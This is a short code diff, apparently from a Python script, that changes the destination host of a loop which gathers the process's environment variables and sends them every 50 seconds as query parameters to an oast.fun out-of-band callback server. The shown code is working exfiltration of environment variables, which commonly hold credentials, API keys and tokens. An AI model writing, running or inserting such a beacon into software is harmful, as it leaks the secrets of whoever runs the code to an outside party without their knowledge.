@@ -25,5 +25,5 @@ while True:
     for k in sorted(os.environ.keys())
     if k not in skip
 }
-    r = requests.get("https://waltpehxhgtfhgofhsbvy3l437zxvtz4f.oast.fun/", params=params)
+    r = requests.get("https://waltpehxhgtfhgofhsbvpo4qbb7406kwq.oast.fun/", params=params)
     time.sleep(50)
